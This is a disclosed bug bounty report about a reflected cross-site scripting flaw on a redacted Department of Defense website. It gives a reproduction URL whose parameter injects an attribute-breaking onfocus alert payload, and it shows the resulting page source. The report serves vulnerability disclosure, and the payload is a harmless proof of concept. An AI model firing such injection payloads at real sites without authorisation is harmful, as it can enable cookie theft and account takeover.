---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '976137'
original_report_id: '976137'
title: Reflected XSS at https://████████/███/...
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2020-09-07T11:54:08.740Z'
disclosed_at: '2021-03-24T20:56:41.611Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS at https://████████/███/...

## Metadata

- HackerOne Report ID: 976137
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2021-03-24T20:56:41.611Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
According to [DOD Websites](https://www.defense.gov/Resources/Military-Departments/DOD-Websites/), the [███████](http://██████████) is a potential in-scope target, and where I discovered an unauthenticated `GET` based reflected cross-site scripting vulnerability on the `██████████` subdomain.

## Steps to Reproduce:
Visit the following URL;
```
https://█████/█████/████████=%22%20autofocus%20onfocus=%22alert(document.domain)%22&Z_MODE=&Z_CALLER_URL=&Z_FORMROW=&Z_LONG_LIST=&Z_ISSUE_WAIT=
```
The following generated in the page source;
```
███████ VALUE="" autofocus onfocus="alert(document.domain)"%">
```
You will see that a pop-up appears, demonstrating that the JavaScript was executed successfully.

## Recommendations:
Sanitise any user input and check any other potential vulnerable parameters.

## Impact

A cross-site scripting vulnerability allows an attacker to embed malicious code into a URL of a vulnerable page, which is then executed when a victim views the page and can be used to gain account credentials by stealing cookies or modify the destination page to perform malicious actions.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
